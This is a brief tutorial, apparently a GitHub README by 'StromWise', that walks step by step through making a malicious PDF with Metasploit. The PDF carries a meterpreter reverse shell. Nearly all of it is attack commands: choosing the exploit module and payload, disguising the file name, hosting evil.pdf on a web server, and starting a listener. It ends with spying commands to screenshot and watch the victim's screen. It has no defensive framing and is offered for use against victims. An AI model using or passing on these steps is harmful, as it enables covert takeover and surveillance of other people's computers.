# In this tutorial you will learn how to GET REVERSE SHELL USING .PDF FILE. 


STEP 1:  OPEN KALI TERMINAL

STEP 2:  sudo msfconsole

STEP 3:  use exploit/windows/fileformat/adobe_pdf_embedded_exe

STEP 4:  show options

STEP 5:  set payload windows/x64/meterpreter/reverse_tcp

STEP #:  set FILENAME test.pdf (test.pdf = you can type any name which you want the user to see)

STEP #:  set INFILENAME PATHFILE (HERE YOU NEED TO ENTER THE PATH OF THE FILE YOU WANT YOUR USER TO SEE)

STEP 6:  ip addr

STEP 7:  copy the ip address

STEP 8:  show options

STEP 9:  exploit

STEP 10:  sudo mv /root/.msf4/local/evil.pdf /var/www/html/evil.pdf

STEP 11:  sudo systemctl start apache.service

STEP 12:  use exploit/multi/handler

STEP 13:  set payload windows/x64/meterpreter/reverse_tcp

STEP 14:  show options

STEP 15:  set LHOST ip address of kali machine

STEP 16:  exploit



## NOW JUST OPEN THE FILE IN VICTIMS MACHINE AND BOOM YOU WILL GET WHOLE ACCESS

STEP 1:  192.168.0.0/evil.pdf  (ipaddress should be of your server on  kali machine)









## commands :

- screensh - to take screenshot of victim's machine
- screenshare - to see victims screen whats going on the victims computer 






____________________________________________________________________________________________________________________________________________
▶ Name: StromWise

▶ Role: Creator

▶ Location: Unknown

▶ GitHub: https://github.com/stromwise 

▶ Instagram: https://www.instagram.com/stromwise/ 

▶ Facebook: https://www.facebook.com/profile.php?id=100093706328777

▶ Youtube: https://www.youtube.com/channel/UC-tafc0TqgZNnQio8Gj-hjg 

▶ Twitter: https://twitter.com/StromWise 
____________________________________________________________________________________________________________________________________________


